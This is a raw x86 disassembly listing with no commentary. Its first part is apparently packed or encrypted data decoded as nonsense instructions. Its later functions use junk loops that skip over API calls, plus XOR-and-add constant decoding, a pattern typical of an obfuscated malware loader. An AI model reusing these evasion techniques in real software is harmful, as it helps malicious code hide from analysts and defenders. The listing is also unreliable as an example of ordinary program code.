  40f474:	aad    0x36
  40f476:	xor    ebp,DWORD PTR ds:0xeeae4b4d
  40f47c:	and    BYTE PTR [edi*4-0x2269a214],0x3e
  40f484:	scas   eax,DWORD PTR es:[edi]
  40f485:	test   DWORD PTR [esi+0x9],edx
  40f488:	in     eax,0xf5
  40f48a:	mov    al,0xa5
  40f48c:	cmp    al,0x37
  40f48e:	mov    bl,BYTE PTR [edx+0x124b7e1b]
  40f494:	js     0x40f4de
  40f496:	inc    ebx
  40f497:	scas   al,BYTE PTR es:[edi]
  40f498:	adc    dl,BYTE PTR [esi+eiz*4-0x36]
  40f49c:	push   ds
  40f49d:	in     eax,dx
  40f49e:	dec    edx
  40f49f:	ds js  0x40f491
  40f4a2:	leave  
  40f4a3:	jbe    0x40f51c
  40f4a5:	pop    esi
  40f4a6:	pop    ebx
  40f4a7:	dec    ecx
  40f4a8:	pop    es
  40f4a9:	ss xor eax,eax
  40f4ac:	int    0x13
  40f4ae:	mov    ebp,0x5cc70229
  40f4b3:	repz sahf 
  40f4b5:	mov    BYTE PTR [esi+0x1d],al
  40f4b8:	out    0x4,eax
  40f4ba:	iret   
  40f4bb:	cmp    bh,BYTE PTR [edx-0x9f6e6]
  40f4c1:	cli    
  40f4c2:	sub    BYTE PTR [eax-0x7420146f],cl
  40f4c8:	mov    eax,0xe540a084
  40f4cd:	ss cld 
  40f4cf:	mov    ds:0x7827e773,al
  40f4d4:	and    ah,BYTE PTR [ebx]
  40f4d6:	pop    eax
  40f4d7:	cmp    ebx,0x68
  40f4da:	jo     0x40f4a2
  40f4dc:	cmc    
  40f4dd:	(bad)  
  40f4de:	sbb    al,0x11
  40f4e0:	xchg   ebx,eax
  40f4e1:	aam    0xb8
  40f4e3:	dec    eax
  40f4e4:	pop    ebp
  40f4e5:	sub    al,0xc0
  40f4e7:	rcl    BYTE PTR [edi+0x4],cl
  40f4ea:	jb     0x40f49c
  40f4ec:	pop    edi
  40f4ee:	xchg   ebx,eax
  40f4ef:	cmp    eax,0x49cdebe7
  40f4f4:	adc    DWORD PTR [edx-0x826a68b],0xdd554132
  40f4fe:	repnz (bad) 
  40f500:	les    ebp,FWORD PTR [esi]
  40f502:	push   edi
  40f503:	xchg   BYTE PTR gs:[ebx+0x5c],bh
  40f507:	pop    ss
  40f508:	enter  0x232a,0xc6
  40f50c:	daa    
  40f50d:	sti    
  40f50e:	sbb    edi,DWORD PTR [esi]
  40f510:	xchg   ebp,eax
  40f511:	in     al,0x78
  40f513:	ss pop es
  40f515:	or     eax,0xc65124cf
  40f51a:	outs   dx,DWORD PTR ds:[esi]
  40f51b:	xor    eax,0x1725c984
  40f520:	or     esp,DWORD PTR [eax+0x44]
  40f523:	(bad)  
  40f524:	pop    edi
  40f525:	pop    ebx
  40f526:	jbe    0x40f4ca
  40f528:	sbb    bh,BYTE PTR [edx]
  40f52a:	test   al,0xf8
  40f52c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f52d:	add    BYTE PTR [ebp-0x885a812],bh
  40f533:	test   BYTE PTR [ebx],ah
  40f535:	add    eax,DWORD PTR [ebx-0x29]
  40f538:	stos   DWORD PTR es:[edi],eax
  40f539:	mov    ds:0xf5e5aff5,al
  40f53e:	and    DWORD PTR [esi-0x4e],eax
  40f541:	call   esi
  40f543:	fstp   DWORD PTR [edi]
  40f545:	jg     0x40f52d
  40f547:	xor    eax,DWORD PTR [eax+0x1e3c8a91]
  40f54d:	(bad)  
  40f54e:	dec    ebx
  40f54f:	out    dx,al
  40f550:	xor    BYTE PTR [eax-0x37fe9c6e],bl
  40f556:	or     dl,BYTE PTR [esi]
  40f558:	jnp    0x40f51c
  40f55a:	fsubr  QWORD PTR [esi-0x63388332]
  40f560:	and    al,0x51
  40f562:	cmc    
  40f563:	sub    DWORD PTR [eax],eax
  40f565:	and    al,BYTE PTR [ecx]
  40f567:	or     ax,0x666d
  40f56b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f56c:	xchg   esp,eax
  40f56d:	mov    ecx,0xeea8b1bf
  40f572:	add    cl,ah
  40f574:	retf   
  40f575:	imul   ebx,ebx,0x9514368b
  40f57b:	arpl   WORD PTR [edi-0x222ef2d3],cx
  40f581:	or     ah,0x58
  40f584:	jge    0x40f552
  40f586:	cwde   
  40f587:	ret    
  40f588:	fisttp QWORD PTR [esi]
  40f58a:	xor    dl,ah
  40f58c:	sti    
  40f58d:	arpl   WORD PTR [edi-0x1e],ax
  40f590:	xchg   ebp,eax
  40f591:	xchg   ebp,eax
  40f592:	mov    esi,?
  40f594:	xor    bh,BYTE PTR [edi-0x1b2cd5e5]
  40f59a:	ins    BYTE PTR es:[edi],dx
  40f59b:	xchg   esp,eax
  40f59c:	add    al,ch
  40f59e:	mov    eax,ds:0xd7eefb02
  40f5a3:	or     bl,BYTE PTR [esi-0x3d]
  40f5a6:	nop
  40f5a7:	and    al,0x6b
  40f5a9:	jp     0x40f5bb
  40f5ab:	rcr    BYTE PTR [edi],0x7f
  40f5ae:	push   ebx
  40f5af:	data16 sti 
  40f5b1:	add    DWORD PTR [edx+0x4c],esp
  40f5b4:	push   edx
  40f5b5:	rol    BYTE PTR [edi],0x31
  40f5b8:	daa    
  40f5b9:	push   es
  40f5ba:	jg     0x40f61e
  40f5bc:	xor    al,BYTE PTR [eax-0x5fdb90d2]
  40f5c2:	pushf  
  40f5c3:	(bad)  
  40f5c5:	jle    0x40f5b7
  40f5c7:	and    eax,0x9d0be847
  40f5cc:	sbb    al,0xbd
  40f5ce:	adc    al,0xdc
  40f5d0:	addr16 xchg edx,eax
  40f5d2:	jne    0x40f55c
  40f5d4:	sub    al,0xa7
  40f5d6:	sub    ah,bh
  40f5d8:	or     esp,DWORD PTR [edi+eiz*8+0x22]
  40f5dc:	icebp  
  40f5dd:	out    0x75,al
  40f5df:	jno    0x40f5bd
  40f5e1:	sub    BYTE PTR ds:[edi+0x71],bl
  40f5e5:	fsub   QWORD PTR [ebx+0x6d2ed097]
  40f5eb:	or     BYTE PTR [edi],dh
  40f5ed:	mov    esp,0x844cf20f
  40f5f2:	pop    ecx
  40f5f3:	fcomp  st(1)
  40f5f5:	hlt    
  40f5f6:	jb     0x40f59d
  40f5f8:	fidiv  DWORD PTR [eax]
  40f5fa:	out    dx,al
  40f5fb:	loopne 0x40f5e0
  40f5fd:	mov    al,0x46
  40f5ff:	cdq    
  40f600:	mov    dh,0x11
  40f602:	sbb    DWORD PTR [ecx],ecx
  40f604:	or     esp,esp
  40f606:	leave  
  40f607:	xchg   ebx,eax
  40f608:	add    bh,BYTE PTR [eax+0x2d4d3e68]
  40f60e:	push   edi
  40f60f:	dec    ebp
  40f610:	and    dl,bl
  40f612:	cli    
  40f613:	nop
  40f614:	add    eax,0xa0dbdf7d
  40f619:	jp     0x40f5e7
  40f61b:	(bad)  
  40f61c:	sar    DWORD PTR ds:0x343a38c3,1
  40f622:	adc    dl,0x32
  40f625:	ins    BYTE PTR es:[edi],dx
  40f626:	nop
  40f627:	xor    BYTE PTR [esi-0x6c78acb],dl
  40f62d:	(bad)  
  40f62e:	jl     0x40f63d
  40f630:	mov    ch,0x75
  40f632:	ret    0x64cd
  40f635:	or     esp,0x1bdd9819
  40f63b:	cmp    eax,0x9765cbc5
  40f640:	or     al,0x1c
  40f642:	xor    al,bh
  40f644:	pusha  
  40f645:	pop    ebx
  40f646:	js     0x40f6a7
  40f648:	lahf   
  40f649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f64a:	mov    ds:0x3688f259,eax
  40f64f:	sub    al,0x79
  40f651:	push   ebx
  40f652:	mov    eax,ds:0x93931293
  40f657:	mov    BYTE PTR [edi-0x6a],ch
  40f65a:	out    dx,eax
  40f65b:	push   0x24
  40f65d:	or     cl,BYTE PTR [edi]
  40f65f:	sbb    ebp,DWORD PTR [esp+ebp*1-0x62eec3b5]
  40f666:	adc    DWORD PTR [ebp+ebx*4+0x46],ebp
  40f66a:	rcr    DWORD PTR [ebp-0x3],cl
  40f66d:	out    0x9c,al
  40f66f:	fsub   st,st(2)
  40f671:	or     al,0x5
  40f673:	pop    eax
  40f674:	je     0x40f6b5
  40f676:	std    
  40f677:	in     al,dx
  40f678:	lea    ecx,[eax]
  40f67a:	repz xchg ecx,eax
  40f67c:	and    DWORD PTR [eax],0x48
  40f67f:	or     eax,0xe7a07da1
  40f684:	das    
  40f685:	mov    esi,0xe61063e5
  40f68a:	dec    ebp
  40f68b:	outs   dx,BYTE PTR ds:[esi]
  40f68c:	cmp    DWORD PTR [edi],edi
  40f68e:	in     eax,0xa4
  40f690:	and    dh,BYTE PTR [ebp+0x11445212]
  40f696:	xchg   DWORD PTR [edi-0x323587d3],edi
  40f69c:	xchg   ebp,eax
  40f69d:	mov    dl,0xb8
  40f69f:	xor    ah,BYTE PTR [ebx-0x4c700f38]
  40f6a5:	fwait
  40f6a6:	lea    eax,ds:0x14d4fd3f
  40f6ac:	jns    0x40f6aa
  40f6ae:	xchg   esi,eax
  40f6af:	add    edi,DWORD PTR [ecx+0x7bfb4653]
  40f6b5:	or     DWORD PTR [ecx+0x4a358336],ebp
  40f6bb:	pop    ecx
  40f6bc:	dec    ebp
  40f6bd:	loopne 0x40f66d
  40f6bf:	mov    ecx,0x71311e4d
  40f6c4:	dec    ecx
  40f6c5:	not    BYTE PTR [ecx-0x618f99a2]
  40f6cb:	pop    ebp
  40f6cc:	mov    dl,BYTE PTR [edi]
  40f6ce:	and    al,0x5a
  40f6d0:	mov    eax,ds:0xffbd14bc
  40f6d5:	push   cs
  40f6d6:	jmp    0xd948:0x697d6369
  40f6dd:	sbb    DWORD PTR [eax+0x71],0x35
  40f6e1:	xchg   ebp,eax
  40f6e2:	js     0x40f6e0
  40f6e4:	fcmovnu st,st(0)
  40f6e6:	xchg   DWORD PTR [edi+eiz*4+0x45],ecx
  40f6ea:	rsm    
  40f6ec:	xor    al,0x2d
  40f6ee:	loopne 0x40f67e
  40f6f0:	fwait
  40f6f1:	push   0xe824e03
  40f6f6:	inc    esi
  40f6f7:	mov    ah,0x4
  40f6f9:	jl     0x40f6dc
  40f6fb:	xor    esi,DWORD PTR [edi-0x6ca538f7]
  40f701:	test   eax,0x1c297ce8
  40f706:	inc    edx
  40f707:	(bad)  
  40f708:	xchg   ebx,eax
  40f709:	mov    DWORD PTR [ecx+0xf80a29f],esp
  40f70f:	idiv   esi
  40f711:	js     0x40f772
  40f713:	mov    BYTE PTR [esp+ebx*4-0x2a],cl
  40f717:	test   BYTE PTR [ebx+0x659137e],bh
  40f71d:	loope  0x40f6e3
  40f71f:	shr    BYTE PTR [ecx],0x7d
  40f722:	(bad)  
  40f723:	cmp    edi,esp
  40f725:	push   ebp
  40f726:	push   DWORD PTR [edx-0x547e69df]
  40f72c:	test   al,0x1c
  40f72e:	jp     0x40f759
  40f730:	cdq    
  40f731:	and    BYTE PTR [eax],bl
  40f733:	cmp    DWORD PTR [ebx],ebx
  40f735:	in     eax,dx
  40f736:	les    esp,FWORD PTR [edi]
  40f738:	es pop ebx
  40f73a:	mov    ebp,esp
  40f73c:	sahf   
  40f73d:	jmp    0xf44cf4a3
  40f742:	pop    esp
  40f743:	xchg   ebp,eax
  40f744:	mov    al,ds:0x2ffa4001
  40f749:	std    
  40f74a:	(bad)  
  40f74b:	mov    cl,0x33
  40f74d:	cmp    dl,al
  40f74f:	les    edx,FWORD PTR [ebx]
  40f751:	add    esp,eax
  40f753:	xchg   edx,eax
  40f754:	push   eax
  40f755:	xor    ebx,ebx
  40f757:	mov    edx,esp
  40f759:	dec    edx
  40f75a:	inc    ebx
  40f75b:	add    ebx,DWORD PTR [edx+ebx*1]
  40f75e:	dec    ebx
  40f75f:	xor    edx,edx
  40f761:	add    DWORD PTR [ebp-0x10],ebx
  40f764:	pop    ebx
  40f765:	mov    eax,DWORD PTR [ebp-0x10]
  40f768:	pop    edi
  40f769:	pop    esi
  40f76a:	pop    ebx
  40f76b:	leave  
  40f76c:	ret    0x10
  40f76f:	push   ebp
  40f770:	mov    ebp,esp
  40f772:	push   ecx
  40f773:	mov    DWORD PTR [ebp-0x4],0xf89c85a1
  40f77a:	mov    ecx,DWORD PTR ds:0x42b26e
  40f780:	mov    edx,DWORD PTR ds:0x42b2da
  40f786:	sub    edx,ecx
  40f788:	xor    ecx,DWORD PTR [ecx+edx*1]
  40f78b:	mov    eax,DWORD PTR [ebp-0x4]
  40f78e:	and    DWORD PTR ds:0x42b226,0x0
  40f798:	mov    edx,DWORD PTR ds:0x42b226
  40f79e:	inc    edx
  40f79f:	mov    DWORD PTR ds:0x42b226,edx
  40f7a5:	cmp    DWORD PTR ds:0x42b226,0xb
  40f7ac:	jb     0x40f7f2
  40f7b2:	jmp    0x40f7cb
  40f7b7:	push   DWORD PTR [ebp-0x24]
  40f7ba:	push   DWORD PTR [ebp-0x24]
  40f7bd:	push   0x42a23f
  40f7c2:	push   DWORD PTR [ebp-0x1c]
  40f7c5:	call   DWORD PTR ds:0x42b306
  40f7cb:	cmp    DWORD PTR ds:0x42b226,0xa
  40f7d2:	jne    0x40f7e5
  40f7d8:	mov    edx,DWORD PTR ds:0x42b226
  40f7de:	inc    edx
  40f7df:	mov    DWORD PTR ds:0x42b226,edx
  40f7e5:	cmp    DWORD PTR ds:0x42b226,0x17
  40f7ec:	jb     0x40f798
  40f7f2:	mov    edx,DWORD PTR [ebp+0x10]
  40f7f5:	mov    ecx,0x75108ae
  40f7fa:	add    DWORD PTR ds:0x42b1ea,0x1734
  40f804:	xor    eax,ecx
  40f806:	add    eax,0x3272f5
  40f80b:	mov    DWORD PTR [edx],eax
  40f80d:	mov    eax,DWORD PTR [ebp+0xc]
  40f810:	xor    eax,ecx
  40f812:	push   esi
  40f813:	mov    esi,DWORD PTR [ebp+0x10]
  40f816:	mov    edx,0x3272f5
  40f81b:	add    eax,edx
  40f81d:	mov    DWORD PTR [esi+0x4],eax
  40f820:	mov    eax,DWORD PTR [ebp+0x14]
  40f823:	mov    esi,DWORD PTR [ebp+0x10]
  40f826:	mov    DWORD PTR [esi+0x8],eax
  40f829:	mov    eax,DWORD PTR [ebp+0x18]
  40f82c:	mov    esi,DWORD PTR [ebp+0x10]
  40f82f:	mov    DWORD PTR [esi+0xc],eax
  40f832:	mov    eax,DWORD PTR [ebp+0x1c]
  40f835:	mov    esi,DWORD PTR [ebp+0x10]
  40f838:	mov    DWORD PTR [esi+0x10],eax
  40f83b:	mov    eax,DWORD PTR [ebp+0x8]
  40f83e:	xor    eax,ecx
  40f840:	add    eax,edx
  40f842:	pop    esi
  40f843:	leave  
  40f844:	ret    0x18
  40f847:	push   ebp
  40f848:	mov    ebp,esp
  40f84a:	sub    esp,0x9c
  40f850:	and    DWORD PTR ds:0x42b1b6,0x0
  40f85a:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f860:	inc    ecx
  40f861:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f867:	cmp    DWORD PTR ds:0x42b1b6,0xd
  40f86e:	ja     0x40f8b2
  40f874:	jmp    0x40f88b
  40f879:	push   0x42a1d7
  40f87e:	push   0x0
  40f880:	push   0x7b23
  40f885:	call   DWORD PTR ds:0x42b30e
  40f88b:	cmp    DWORD PTR ds:0x42b1b6,0xc
  40f892:	jne    0x40f8a5
  40f898:	mov    ecx,DWORD PTR ds:0x42b1b6
  40f89e:	inc    ecx
  40f89f:	mov    DWORD PTR ds:0x42b1b6,ecx
  40f8a5:	cmp    DWORD PTR ds:0x42b1b6,0x14
  40f8ac:	jb     0x40f85a
  40f8b2:	mov    ecx,DWORD PTR [ebp+0x8]
  40f8b5:	xor    eax,DWORD PTR ds:0x42b1a6
  40f8bb:	mov    eax,0x8a9a
  40f8c0:	xor    ax,WORD PTR [ecx+0x20]
  40f8c4:	xor    DWORD PTR ds:0x42b1d6,ebx
  40f8ca:	mov    ecx,0x3b5c
  40f8cf:	adc    DWORD PTR ds:0x42b206,0x42b22e
  40f8d9:	add    ax,cx
  40f8dc:	and    DWORD PTR ds:0x42b1ba,0x0
  40f8e6:	mov    ecx,DWORD PTR ds:0x42b1ba
  40f8ec:	inc    ecx
  40f8ed:	mov    DWORD PTR ds:0x42b1ba,ecx
  40f8f3:	cmp    DWORD PTR ds:0x42b1ba,0x1e
  40f8fa:	jge    0x40f91b
  40f900:	jmp    0x40f90e
  40f905:	push   DWORD PTR [ebp-0x20]
  40f908:	call   DWORD PTR ds:0x42b316
  40f90e:	cmp    DWORD PTR ds:0x42b1ba,0x19
  40f915:	jb     0x40f8e6
  40f91b:	movzx  eax,ax
  40f91e:	or     ecx,DWORD PTR ds:0x42b1fa
  40f924:	mov    DWORD PTR [ebp-0x10],eax
  40f927:	and    DWORD PTR ds:0x42b1a2,0x5305
  40f931:	mov    BYTE PTR [ebp-0x1],0x80
  40f935:	mov    ecx,DWORD PTR ds:0x42b22a
  40f93b:	sub    DWORD PTR ds:0x42b1f6,ecx
  40f941:	lea    eax,[ebp-0x1]
  40f944:	mov    DWORD PTR ds:0x42b21e,0x14
  40f94e:	cmp    DWORD PTR ds:0x42b21e,0x0
  40f955:	je     0x40f9a6
  40f95b:	cmp    DWORD PTR ds:0x42b21e,0x4
  40f962:	ja     0x40f9a6
  40f968:	jmp    0x40f97a
  40f96d:	push   0x5
  40f96f:	push   0x6029
  40f974:	call   DWORD PTR ds:0x42b31a
  40f97a:	cmp    DWORD PTR ds:0x42b21e,0x5
  40f981:	jne    0x40f994
  40f987:	mov    ecx,DWORD PTR ds:0x42b21e
  40f98d:	dec    ecx
  40f98e:	mov    DWORD PTR ds:0x42b21e,ecx
  40f994:	mov    ecx,DWORD PTR ds:0x42b21e
  40f99a:	dec    ecx
  40f99b:	mov    DWORD PTR ds:0x42b21e,ecx
  40f9a1:	jmp    0x40f94e
  40f9a6:	mov    DWORD PTR [ebp-0xc],eax
  40f9a9:	or     ecx,DWORD PTR ds:0x42b212
  40f9af:	mov    al,BYTE PTR [ebp-0x1]
  40f9b2:	xor    DWORD PTR ds:0x42b226,0x485
  40f9bc:	mov    ecx,DWORD PTR [ebp-0xc]
  40f9bf:	xor    al,0x7e
  40f9c1:	add    al,0x3
  40f9c3:	and    DWORD PTR ds:0x42b20a,0x20b6
  40f9cd:	mov    BYTE PTR [ecx],al
  40f9cf:	sbb    ecx,0x5f8e
  40f9d5:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  40f9dc:	push   ebx
  40f9dd:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  40f9e4:	and    DWORD PTR ds:0x42b1da,0x0
  40f9ee:	jmp    0x40f9fe
  40f9f3:	mov    eax,ds:0x42b1da
  40f9f8:	inc    eax
  40f9f9:	mov    ds:0x42b1da,eax
  40f9fe:	cmp    DWORD PTR ds:0x42b1da,0x14
  40fa05:	jae    0x40fa55
  40fa0b:	cmp    DWORD PTR ds:0x42b1da,0xb
  40fa12:	jbe    0x40fa55
  40fa18:	jmp    0x40fa35
  40fa1d:	push   0x42b1f2
  40fa22:	push   DWORD PTR [ebp-0xc]
  40fa25:	push   0x42a000
  40fa2a:	push   0x42a18d
  40fa2f:	call   DWORD PTR ds:0x42b31e
  40fa35:	cmp    DWORD PTR ds:0x42b1da,0xa
  40fa3c:	jne    0x40fa50
  40fa42:	xor    eax,eax
  40fa44:	xor    eax,DWORD PTR ds:0x42b1da
  40fa4a:	inc    eax
  40fa4b:	mov    ds:0x42b1da,eax
  40fa50:	jmp    0x40f9f3
  40fa55:	mov    ecx,DWORD PTR [ebp-0x18]
  40fa58:	sub    DWORD PTR ds:0x42b1fa,0x685a
  40fa62:	push   esi
  40fa63:	dec    esi
  40fa64:	mov    eax,0x75108ae
  40fa69:	and    DWORD PTR ds:0x42b1b2,0x4a0b
  40fa73:	xor    ecx,eax
  40fa75:	or     DWORD PTR ds:0x42b212,ebx
  40fa7b:	mov    esi,0x3272f5
  40fa80:	adc    DWORD PTR ds:0x42b216,0x42b222
  40fa8a:	push   edi
  40fa8b:	and    DWORD PTR ds:0x42b19a,0x42b1a2
  40fa95:	add    ecx,esi
  40fa97:	mov    DWORD PTR ds:0x42b212,0x27f7
  40faa1:	jmp    0x40facf
  40faa6:	mov    DWORD PTR ds:0x42b1a2,0x4c70
  40fab0:	mov    dl,BYTE PTR [ebp-0x1]
  40fab3:	mov    DWORD PTR ds:0x42b1da,0x7ef5
  40fabd:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  40fac4:	mov    DWORD PTR ds:0x42b21a,0x736d
  40face:	inc    ecx
  40facf:	mov    DWORD PTR ds:0x42b1b2,0x61ef
  40fad9:	cmp    ecx,0x40
  40fadc:	jb     0x40faa6
  40fae2:	sbb    edx,DWORD PTR ds:0x42b1de
  40fae8:	mov    edx,DWORD PTR [ebp-0x18]
  40faeb:	adc    DWORD PTR ds:0x42b18e,0x3f3e
  40faf5:	xor    edx,eax
  40faf7:	sub    DWORD PTR ds:0x42b1d2,0x42b1ce
  40fb01:	add    edx,esi
  40fb03:	jmp    0x40fbc0
  40fb08:	mov    edi,DWORD PTR [ebp+0x8]
  40fb0b:	mov    ecx,0x8a9a
  40fb10:	sbb    DWORD PTR ds:0x42b1e6,0x42b226
  40fb1a:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40fb1f:	adc    DWORD PTR ds:0x42b1de,ecx
  40fb25:	mov    edi,0x3b5c
  40fb2a:	xor    DWORD PTR ds:0x42b1ca,0x42b1a2
  40fb34:	add    cx,di
  40fb37:	adc    DWORD PTR ds:0x42b1b6,0x7f83
  40fb41:	movzx  ecx,cx
  40fb44:	and    DWORD PTR ds:0x42b1f6,0x42b18a
  40fb4e:	mov    DWORD PTR [ebp-0xc],ecx
  40fb51:	and    DWORD PTR ds:0x42b21a,0x0
  40fb5b:	jmp    0x40fb6d
  40fb60:	mov    ecx,DWORD PTR ds:0x42b21a
  40fb66:	inc    ecx
  40fb67:	mov    DWORD PTR ds:0x42b21a,ecx
  40fb6d:	cmp    DWORD PTR ds:0x42b21a,0x19
  40fb74:	jae    0x40fb9c
  40fb7a:	cmp    DWORD PTR ds:0x42b21a,0x1e
  40fb81:	jge    0x40fb9c
  40fb87:	jmp    0x40fb97
  40fb8c:	push   0x1c76
  40fb91:	call   DWORD PTR ds:0x42b322
  40fb97:	jmp    0x40fb60
  40fb9c:	mov    ecx,DWORD PTR [ebp+0x8]
  40fb9f:	add    DWORD PTR ds:0x42b1d2,0x42b1ea
  40fba9:	movzx  ecx,WORD PTR [ecx+edx*4]
  40fbad:	xor    ecx,0x8a9a
  40fbb3:	add    ecx,edi
  40fbb5:	mov    edi,DWORD PTR [ebp-0xc]
  40fbb8:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  40fbbf:	inc    edx
  40fbc0:	mov    ecx,0xfa9
  40fbc5:	mov    ecx,DWORD PTR [ebp-0x10]
  40fbc8:	cmp    edx,ecx
  40fbca:	jne    0x40fb08
  40fbd0:	mov    DWORD PTR ds:0x42b186,0x1e
  40fbda:	cmp    DWORD PTR ds:0x42b186,0x0
  40fbe1:	je     0x40fc18
  40fbe7:	cmp    DWORD PTR ds:0x42b186,0x24
  40fbee:	jle    0x40fc18
  40fbf4:	jmp    0x40fc04
  40fbf9:	push   0x7864
  40fbfe:	call   DWORD PTR ds:0x42b326
  40fc04:	xor    ecx,ecx
  40fc06:	add    ecx,DWORD PTR ds:0x42b186
  40fc0c:	dec    ecx
  40fc0d:	mov    DWORD PTR ds:0x42b186,ecx
  40fc13:	jmp    0x40fbda
  40fc18:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc1b:	and    edi,edx
  40fc1d:	mov    edx,DWORD PTR [ebp+0x10]
  40fc20:	and    DWORD PTR ds:0x42b19a,0x0
  40fc2a:	mov    edi,DWORD PTR ds:0x42b19a
  40fc30:	inc    edi
  40fc31:	mov    DWORD PTR ds:0x42b19a,edi
  40fc37:	cmp    DWORD PTR ds:0x42b19a,0x25
  40fc3e:	jge    0x40fc76
  40fc44:	jmp    0x40fc69
  40fc49:	push   0x42a0fe
  40fc4e:	push   0x5d6f
  40fc53:	push   0x13cc
  40fc58:	push   DWORD PTR [ebp-0x1c]
  40fc5b:	push   0x3c54
  40fc60:	push   DWORD PTR [ebp-0x20]
  40fc63:	call   DWORD PTR ds:0x42b2ea
  40fc69:	cmp    DWORD PTR ds:0x42b19a,0x1d
  40fc70:	jb     0x40fc2a
  40fc76:	xor    ecx,eax
  40fc78:	inc    edi
  40fc79:	add    ecx,esi
  40fc7b:	and    DWORD PTR ds:0x42b1b6,0x0
  40fc85:	jmp    0x40fc97
  40fc8a:	mov    edi,DWORD PTR ds:0x42b1b6
  40fc90:	inc    edi
  40fc91:	mov    DWORD PTR ds:0x42b1b6,edi
  40fc97:	cmp    DWORD PTR ds:0x42b1b6,0x10
  40fc9e:	jae    0x40fcea
  40fca4:	cmp    DWORD PTR ds:0x42b1b6,0x6
  40fcab:	jl     0x40fcea
  40fcb1:	jmp    0x40fcc9
  40fcb6:	push   0x42a0fe
  40fcbb:	push   DWORD PTR [ebp-0x14]
  40fcbe:	push   0x1
  40fcc0:	push   DWORD PTR [ebp-0x1c]
  40fcc3:	call   DWORD PTR ds:0x42b2ee
  40fcc9:	cmp    DWORD PTR ds:0x42b1b6,0x5
  40fcd0:	jne    0x40fce5
  40fcd6:	xor    edi,edi
  40fcd8:	xor    edi,DWORD PTR ds:0x42b1b6
  40fcde:	inc    edi
  40fcdf:	mov    DWORD PTR ds:0x42b1b6,edi
  40fce5:	jmp    0x40fc8a
  40fcea:	mov    DWORD PTR [edx],ecx
  40fcec:	xor    ecx,ecx
  40fcee:	mov    ecx,DWORD PTR [ebp-0x18]
  40fcf1:	and    DWORD PTR ds:0x42b1e2,0x0
  40fcfb:	xor    edi,edi
  40fcfd:	xor    edi,DWORD PTR ds:0x42b1e2
  40fd03:	inc    edi
  40fd04:	mov    DWORD PTR ds:0x42b1e2,edi
  40fd0a:	cmp    DWORD PTR ds:0x42b1e2,0x29
  40fd11:	ja     0x40fd32
  40fd17:	jmp    0x40fd25
  40fd1c:	push   DWORD PTR [ebp-0x14]
  40fd1f:	call   DWORD PTR ds:0x42b2f2
  40fd25:	cmp    DWORD PTR ds:0x42b1e2,0x19
  40fd2c:	jb     0x40fcfb
  40fd32:	xor    ecx,eax
  40fd34:	and    edi,0x72ff
  40fd3a:	add    ecx,esi
  40fd3c:	or     DWORD PTR ds:0x42b182,0x54fc
  40fd46:	mov    DWORD PTR [ebp-0xc],ecx
  40fd49:	adc    edi,DWORD PTR ds:0x42b1e6
  40fd4f:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  40fd56:	or     edi,DWORD PTR ds:0x42b226
  40fd5c:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  40fd63:	and    DWORD PTR ds:0x42b1ba,0x0
  40fd6d:	jmp    0x40fd7f
  40fd72:	mov    ecx,DWORD PTR ds:0x42b1ba
  40fd78:	inc    ecx
  40fd79:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fd7f:	cmp    DWORD PTR ds:0x42b1ba,0x12
  40fd86:	jae    0x40fdca
  40fd8c:	cmp    DWORD PTR ds:0x42b1ba,0x4
  40fd93:	jle    0x40fdca
  40fd99:	jmp    0x40fda9
  40fd9e:	push   0x42b226
  40fda3:	call   DWORD PTR ds:0x42b2f6
  40fda9:	cmp    DWORD PTR ds:0x42b1ba,0x3
  40fdb0:	jne    0x40fdc5
  40fdb6:	xor    ecx,ecx
  40fdb8:	xor    ecx,DWORD PTR ds:0x42b1ba
  40fdbe:	inc    ecx
  40fdbf:	mov    DWORD PTR ds:0x42b1ba,ecx
  40fdc5:	jmp    0x40fd72
  40fdca:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  40fdd1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fdd4:	mov    DWORD PTR [ebp+0x8],ecx
  40fdd7:	mov    ecx,DWORD PTR [ebp+0x8]
  40fdda:	xor    DWORD PTR ds:0x42b20a,edi
  40fde0:	xor    ecx,eax
  40fde2:	or     edi,DWORD PTR ds:0x42b182
  40fde8:	add    ecx,esi
  40fdea:	mov    ecx,0x242ebf1
  40fdef:	mov    edi,0xf641bf0
  40fdf4:	je     0x419191
  40fdfa:	add    DWORD PTR ds:0x42b1c2,0x6a2f
  40fe04:	mov    edx,DWORD PTR [ebp+0x8]
  40fe07:	mov    ebx,DWORD PTR ds:0x42b1aa
  40fe0d:	and    ebx,DWORD PTR ds:0x42b1f2
  40fe13:	mov    DWORD PTR ds:0x42b1aa,ebx
  40fe19:	mov    ebx,DWORD PTR [ebp-0x8]
  40fe1c:	xor    edx,eax
  40fe1e:	xor    ebx,eax
  40fe20:	xor    DWORD PTR ds:0x42b1e6,0x42b196
  40fe2a:	sub    edx,ebx
  40fe2c:	sub    edx,esi
  40fe2e:	mov    DWORD PTR ds:0x42b1ce,0x13
  40fe38:	cmp    DWORD PTR ds:0x42b1ce,0x0
  40fe3f:	je     0x40fe81
  40fe45:	cmp    DWORD PTR ds:0x42b1ce,0x1c
  40fe4c:	jb     0x40fe81
  40fe52:	jmp    0x40fe6f
  40fe57:	push   0x42b1ca
  40fe5c:	push   0x42b196
  40fe61:	push   DWORD PTR [ebp-0x1c]
  40fe64:	push   0x42a12c
  40fe69:	call   DWORD PTR ds:0x42b2fa
  40fe6f:	mov    ebx,DWORD PTR ds:0x42b1ce
  40fe75:	dec    ebx
  40fe76:	mov    DWORD PTR ds:0x42b1ce,ebx
  40fe7c:	jmp    0x40fe38
  40fe81:	xor    edx,eax
  40fe83:	and    DWORD PTR ds:0x42b196,0x0
  40fe8d:	jmp    0x40fe9f
  40fe92:	mov    ebx,DWORD PTR ds:0x42b196
  40fe98:	inc    ebx
